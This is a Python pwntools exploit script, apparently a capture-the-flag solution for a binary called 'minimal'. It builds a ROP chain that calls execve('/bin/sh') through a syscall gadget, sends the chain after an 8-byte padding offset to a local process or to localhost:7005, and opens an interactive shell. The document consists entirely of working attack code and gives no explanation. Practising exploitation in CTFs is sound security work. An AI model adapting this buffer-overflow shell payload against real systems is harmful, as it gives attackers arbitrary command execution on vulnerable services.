#!/usr/bin/env python3

from pwn import *

exe = ELF("minimal")
rop = ROP(exe)

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("localhost", 7005)
    elif args.GDB:
        return gdb.debug([exe.path])
    else:
        return process([exe.path])


def main():
    r = conn()

    payload = flat({
        8: [
            p64((rop.find_gadget(['pop rax', 'ret']))[0]),
            p64(59),
            p64((rop.find_gadget(['pop rdi', 'ret']))[0]),
            p64(next(exe.search(b'/bin/sh'))),
            p64((rop.find_gadget(['pop rsi', 'ret']))[0]),
            p64(0),
            p64((rop.find_gadget(['pop rdx', 'ret']))[0]),
            p64(0),
            p64((rop.find_gadget(['syscall']))[0]),
        ] 
    })
    r.sendline(payload)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

